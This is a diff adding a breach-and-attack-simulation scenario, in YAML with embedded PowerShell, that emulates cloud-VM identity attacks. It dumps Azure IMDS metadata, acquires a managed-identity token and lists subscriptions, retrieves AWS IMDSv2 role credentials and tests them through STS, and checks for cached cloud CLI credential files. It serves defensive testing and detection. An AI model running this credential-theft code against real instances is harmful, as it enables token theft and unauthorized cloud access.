@@ -1,0 +1,282 @@
+id: cloud-vm-attack
+name: Cloud VM Attack  -  Azure/AWS Instance Metadata Token Theft & IAM Discovery
+description: >
+  Five-stage, environment-conditional emulation of cloud-VM identity attacks
+  (Azure Instance Metadata Service, AWS EC2 Instance Metadata Service, and
+  locally cached cloud CLI credentials). Cloud Attack pack Sub-pack 2 --
+  distinct from scenarios/entra-hybrid-identity-attack.yaml (Sub-pack 1),
+  which targets on-prem/Entra-hybrid-joined Windows endpoints regardless of
+  where they physically run. This scenario only produces meaningful results
+  when the agent actually runs on an Azure VM or AWS EC2 instance.
+
+  ENVIRONMENT-CONDITIONAL BY DESIGN, WITHOUT ANY NEW ENGINE MECHANISM: each
+  cloud-specific step independently attempts its own fast (2-second timeout)
+  reachability check against that cloud's metadata service, and self-reports
+  "SKIP: ..." as its first output line when unreachable -- the existing
+  first-line "SKIP:" marker convention this platform already uses elsewhere
+  (see internal/scenario/outcome.go's classifyExecution) is the entire
+  mechanism; no new cloud-detection subsystem was built for this. Each check
+  is independent, not chained: this engine has no step-to-step output/state
+  passing, so Stage 2 does not literally reuse Stage 1's in-memory token --
+  it performs its own separate IMDS reachability check and its own separate
+  token request, the same way a real attacker's tooling would if run as two
+  distinct actions.
+
+  Expected outcome on each environment:
+    On-prem Windows          -- Stages 1-4 SKIP; Stage 5 still runs (checks
+                                 local cached CLI credentials, applicable
+                                 regardless of where the endpoint runs)
+    Azure VM                 -- Stages 1-2 execute; Stages 3-4 SKIP
+    AWS EC2 instance         -- Stages 3-4 execute; Stages 1-2 SKIP
+    Air-gapped environment   -- no live internet dependency anywhere in this
+                                 scenario (IMDS is a link-local address
+                                 reachable only from inside the VM itself)
+
+  SCORING NOTE on Stages 2 and 4: when the metadata service IS reachable
+  (confirming a real Azure VM / EC2 instance) but NO managed identity / IAM
+  role is attached, that step returns PASS, not SKIP -- the test genuinely
+  ran and found nothing exploitable, and not provisioning excess identity to
+  a VM is itself a real, creditable least-privilege security posture, not
+  merely "the test doesn't apply here."
+
+  EXPLICITLY EXCLUDED (documented, not silently dropped): S3/Blob enumeration
+  and Azure Key Vault / AWS Secrets Manager dumping. Real Atomic Red Team
+  content exists for both (T1619, T1555.006), but every usable test requires
+  a pre-authenticated cloud CLI session (az login / aws configure already
+  done) that this platform's endpoint-only agent cannot provision -- same
+  infrastructure gap as the Exchange-Online-dependent techniques excluded
+  from the Email Attack pack. T1619's one no-auth-dependency test (anonymous
+  Blob-access scan) was also excluded: its default target is a placeholder
+  storage-account name that always returns "not accessible" without
+  deployment-specific configuration, producing no real signal.
+author: Audspect Research
+executable: true
+supported_os: [windows]
+tags:
+  - cloud
+  - azure
+  - aws
+  - imds
+  - managed-identity
+  - iam
+  - cloud-vm
+  - bfsi
+  - t1552
+  - t1552.005
+  - t1552.001
+  - t1550.001
+  - mitre-attack
+mitre_phases:
+  - credential-access
+  - discovery
+
+steps:
+  # ── Stage 1 — Azure IMDS Instance Metadata Dump (real ART atomic, T1552.005
+  #    test 1, PowerShell, no deps -- wrapped with a short timeout so it SKIPs
+  #    fast on non-Azure hosts instead of hanging on the real atomic's own
+  #    unbounded call) ────────────────────────────────────────────────────────
+  - name: "Stage 1 - Azure IMDS Instance Metadata Dump (T1552.005)"
+    technique_id: T1552.005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Read-only GET to the Azure Instance Metadata Service (a link-local address, 169.254.169.254, reachable only from inside the VM itself -- no external network access, no credentials needed). No state change."
+    telemetry:
+      - "Sysmon EID 3: powershell.exe connecting to 169.254.169.254:80"
+    detection:
+      - "EDR/NSG: outbound connection to the IMDS link-local address from a non-management process -- IMDS recon is a well-known real-world attacker precondition check"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $meta = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -TimeoutSec 2
+      } catch {
+        Write-Output "SKIP: Azure IMDS unreachable -- this endpoint is not an Azure VM (or IMDS access is blocked at the host). [BAS-SIM-CLOUDVM-S1]"
+        exit 0
+      }
+      $vmId = $meta.compute.vmId
+      $vmName = $meta.compute.name
+      $subId = $meta.compute.subscriptionId
+      Write-Output "EXEC T1552.005: Azure Instance Metadata dumped -- vmId=$vmId, vmName=$vmName, subscriptionId=$subId. [BAS-SIM-CLOUDVM-S1]"
+      Write-Output "FAIL: Azure IMDS metadata (including subscription/resource-group/VM identifiers) was retrievable without any authentication -- this is real attacker reconnaissance capability unless outbound access to 169.254.169.254 is restricted at the host firewall."
+    cleanup: ""
+
+  # ── Stage 2 — Azure Managed-Identity Token & Subscription/IAM Discovery
+  #    (hand-authored: no real ART atomic covers the follow-on IAM discovery
+  #    step -- T1087.004 has zero real atomics upstream, confirmed) ─────────
+  - name: "Stage 2 - Azure Managed-Identity Token & Subscription Discovery (T1550.001)"
+    technique_id: T1550.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Requests a managed-identity ARM access token via IMDS (read-only, no credentials supplied), then makes one read-only ARM API call (GET .../subscriptions) if a token was obtained. No writes, no resource changes anywhere."
+    telemetry:
+      - "Sysmon EID 3: powershell.exe connecting to 169.254.169.254:80 and management.azure.com:443"
+    detection:
+      - "Azure AD sign-in logs: a managed-identity token issuance event for this VM's identity"
+      - "Azure Activity Log: a subscriptions list/read call from this VM's managed identity"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $tokenResp = Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -TimeoutSec 2
+      } catch {
+        Write-Output "SKIP: Azure IMDS unreachable -- this endpoint is not an Azure VM (or IMDS access is blocked at the host). Independent check from Stage 1 -- this engine has no step-to-step state passing. [BAS-SIM-CLOUDVM-S2]"
+        exit 0
+      }
+      if (-not $tokenResp.access_token) {
+        Write-Output "PASS: Azure IMDS is reachable (confirmed Azure VM) but no managed identity is assigned -- no ARM token available, so this VM's identity cannot be used to pivot to subscription-level access. [BAS-SIM-CLOUDVM-S2]"
+        exit 0
+      }
+      try {
+        $subs = Invoke-RestMethod -Headers @{"Authorization"="Bearer $($tokenResp.access_token)"} -Method GET -Uri "https://management.azure.com/subscriptions?api-version=2020-01-01" -TimeoutSec 5
+        $count = ($subs.value | Measure-Object).Count
+        Write-Output "EXEC T1550.001: Azure managed-identity token acquired and used against ARM -- $count subscription(s) visible. [BAS-SIM-CLOUDVM-S2]"
+        Write-Output "FAIL: this VM's managed identity was usable to enumerate Azure subscription-level resources with zero additional credentials -- review whether this identity's role assignment follows least privilege."
+      } catch {
+        Write-Output "FAIL: a managed-identity ARM token was successfully acquired via IMDS (a real credential-theft outcome on its own) even though the follow-on subscriptions call failed -- token acquisition alone is still a meaningful finding."
+      }
+    cleanup: ""
+
+  # ── Stage 3 — AWS EC2 IMDSv2 Instance-Role Credential Theft (real ART
+  #    atomic, T1552.005 test 2, faithfully ported from its sh/Linux form to
+  #    PowerShell -- no Windows-native AWS-IMDS atomic exists upstream,
+  #    confirmed. Same fast-fail timeout pattern as the real atomic's own
+  #    "--connect-timeout 2 -m 5".) ──────────────────────────────────────────
+  - name: "Stage 3 - AWS EC2 IMDSv2 Instance-Role Credential Theft (T1552.005)"
+    technique_id: T1552.005
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 20
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Read-only calls to the AWS EC2 Instance Metadata Service (link-local, 169.254.169.254, reachable only from inside the instance). No state change."
+    telemetry:
+      - "Sysmon EID 3: powershell.exe connecting to 169.254.169.254:80"
+    detection:
+      - "VPC Flow Logs / EDR: connection to the IMDS link-local address from a non-management process -- a well-known real-world attacker precondition check"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $token = Invoke-RestMethod -Method PUT -Uri "http://169.254.169.254/latest/api/token" -Headers @{"X-aws-ec2-metadata-token-ttl-seconds"="21600"} -TimeoutSec 2
+      } catch {
+        Write-Output "SKIP: AWS IMDSv2 unreachable -- this endpoint is not an EC2 instance (or IMDS access is blocked/hop-limited at the host). [BAS-SIM-CLOUDVM-S3]"
+        exit 0
+      }
+      try {
+        $role = Invoke-RestMethod -Method GET -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -Headers @{"X-aws-ec2-metadata-token"=$token} -TimeoutSec 2
+      } catch {
+        Write-Output "PASS: AWS IMDSv2 is reachable (confirmed EC2 instance) but no IAM role is attached -- no credentials available, so this instance's identity cannot be stolen. [BAS-SIM-CLOUDVM-S3]"
+        exit 0
+      }
+      $roleName = ($role -split "`n")[0].Trim()
+      $creds = Invoke-RestMethod -Method GET -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$roleName" -Headers @{"X-aws-ec2-metadata-token"=$token} -TimeoutSec 2
+      Write-Output "EXEC T1552.005: AWS EC2 IAM role credentials retrieved via IMDSv2 for role '$roleName' (AccessKeyId=$($creds.AccessKeyId)). [BAS-SIM-CLOUDVM-S3]"
+      Write-Output "FAIL: this instance's IAM role temporary credentials were retrievable via IMDSv2 without any additional authentication -- verify IMDSv2 hop-limit/token-required enforcement and that the attached role follows least privilege."
+    cleanup: ""
+
+  # ── Stage 4 — AWS STS Identity Discovery via the AWS CLI (hand-authored:
+  #    STS calls require SigV4 request signing, unlike Azure's bearer-token
+  #    ARM calls -- hand-rolling SigV4 signing in PowerShell would be exactly
+  #    the "artificial wrapper" this scenario deliberately avoids. Uses the
+  #    AWS CLI if it's already present on the instance instead, the same way
+  #    a real attacker would on a compromised EC2 host; SKIPs cleanly if the
+  #    CLI isn't installed rather than hand-rolling signing.) ────────────────
+  - name: "Stage 4 - AWS STS Identity Discovery via AWS CLI (T1550.001)"
+    technique_id: T1550.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 25
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Sets the IMDSv2-derived temporary credentials as process-scoped environment variables (never written to disk), makes one read-only 'aws sts get-caller-identity' call, then clears those environment variables. No AWS resources are modified."
+    telemetry:
+      - "Sysmon EID 1: aws.exe (or aws CLI) spawned by powershell.exe with 'sts get-caller-identity' arguments"
+    detection:
+      - "CloudTrail: a GetCallerIdentity event for this instance's role from an unexpected process/host context"
+    command: |
+      $ErrorActionPreference = 'Stop'
+      try {
+        $token = Invoke-RestMethod -Method PUT -Uri "http://169.254.169.254/latest/api/token" -Headers @{"X-aws-ec2-metadata-token-ttl-seconds"="21600"} -TimeoutSec 2
+      } catch {
+        Write-Output "SKIP: AWS IMDSv2 unreachable -- this endpoint is not an EC2 instance (or IMDS access is blocked/hop-limited at the host). Independent check from Stage 3 -- this engine has no step-to-step state passing. [BAS-SIM-CLOUDVM-S4]"
+        exit 0
+      }
+      $awsCli = Get-Command aws -ErrorAction SilentlyContinue
+      if (-not $awsCli) {
+        Write-Output "SKIP: AWS CLI is not installed on this instance -- cannot exercise STS identity discovery without hand-rolling SigV4 request signing, which this scenario deliberately does not do. [BAS-SIM-CLOUDVM-S4]"
+        exit 0
+      }
+      try {
+        $role = Invoke-RestMethod -Method GET -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -Headers @{"X-aws-ec2-metadata-token"=$token} -TimeoutSec 2
+      } catch {
+        Write-Output "PASS: AWS IMDSv2 is reachable (confirmed EC2 instance) but no IAM role is attached -- no credentials available to test STS identity discovery. [BAS-SIM-CLOUDVM-S4]"
+        exit 0
+      }
+      $roleName = ($role -split "`n")[0].Trim()
+      $creds = Invoke-RestMethod -Method GET -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/$roleName" -Headers @{"X-aws-ec2-metadata-token"=$token} -TimeoutSec 2
+      $env:AWS_ACCESS_KEY_ID = $creds.AccessKeyId
+      $env:AWS_SECRET_ACCESS_KEY = $creds.SecretAccessKey
+      $env:AWS_SESSION_TOKEN = $creds.Token
+      try {
+        $identity = & aws sts get-caller-identity --output json 2>&1 | Out-String
+        Write-Output "EXEC T1550.001: IMDSv2-derived role credentials used with the AWS CLI to call STS GetCallerIdentity. [BAS-SIM-CLOUDVM-S4]"
+        Write-Output "FAIL: STS GetCallerIdentity succeeded using this instance's IMDSv2-derived role credentials -- confirms the stolen credentials are immediately usable to enumerate account/identity context. Output: $($identity.Trim())"
+      } catch {
+        Write-Output "FAIL: IMDSv2-derived role credentials were successfully retrieved (Stage 3's outcome, confirmed independently here) even though the AWS CLI's STS call itself failed -- credential theft alone is still a meaningful finding."
+      } finally {
+        Remove-Item Env:\AWS_ACCESS_KEY_ID,Env:\AWS_SECRET_ACCESS_KEY,Env:\AWS_SESSION_TOKEN -ErrorAction SilentlyContinue
+      }
+    cleanup: |
+      Remove-Item Env:\AWS_ACCESS_KEY_ID,Env:\AWS_SECRET_ACCESS_KEY,Env:\AWS_SESSION_TOKEN -ErrorAction SilentlyContinue
+
+  # ── Stage 5 — Cloud CLI Credential/Config Discovery (real ART atomics,
+  #    T1552.001 tests 0+14, faithfully ported from find/macOS-Linux to
+  #    Windows paths, existence-only. Runs on ANY endpoint regardless of
+  #    cloud/on-prem -- it checks locally cached CLI credentials, which have
+  #    independent security value wherever they're found.) ──────────────────
+  - name: "Stage 5 - Cloud CLI Credential/Config Discovery (T1552.001)"
+    technique_id: T1552.001
+    framework: custom
+    executor: powershell
+    requires_priv: user
+    timeout_sec: 15
+    fidelity: telemetry-safe
+    production_safe: true
+    risk: low
+    reversible: true
+    blast_radius: "Checks for the EXISTENCE of well-documented AWS/Azure CLI credential-cache locations (Test-Path only -- never opens, reads, or decrypts any file). No credentials are accessed."
+    telemetry:
+      - "Sysmon EID 1: powershell.exe enumerating .aws/.azure paths under the user profile"
+    detection:
+      - "EDR: enumeration of cloud CLI credential-cache locations by a non-Microsoft-signed process -- precedes real T1552.001 credential theft"
+    command: |
+      $ErrorActionPreference = 'SilentlyContinue'
+      $awsCredFile = Join-Path $env:USERPROFILE ".aws\credentials"
+      $azureMsalCache = Join-Path $env:USERPROFILE ".azure\msal_token_cache.json"
+      $azureAccessTokens = Join-Path $env:USERPROFILE ".azure\accessTokens.json"
+      $found = @()
+      if (Test-Path $awsCredFile) { $found += "AWS-CLI-credentials" }
+      if (Test-Path $azureMsalCache) { $found += "Azure-CLI-msal-token-cache" }
+      if (Test-Path $azureAccessTokens) { $found += "Azure-CLI-legacy-accessTokens" }
+      Write-Output "EXEC T1552.001: cached cloud CLI credential/config locations checked (existence only, no content read). Found: $($found -join ', '). [BAS-SIM-CLOUDVM-S5]"
+      if ($found.Count -gt 0) {
+        Write-Output "FAIL: $($found.Count) cached cloud CLI credential file(s) exist on this endpoint and were enumerated without interference -- exactly what a real T1552.001 credential-theft tool targets, regardless of whether this endpoint is itself a cloud VM."
+      } else {
+        Write-Output "PASS: no cached AWS/Azure CLI credential files were found on this endpoint."
+      }
+    cleanup: ""
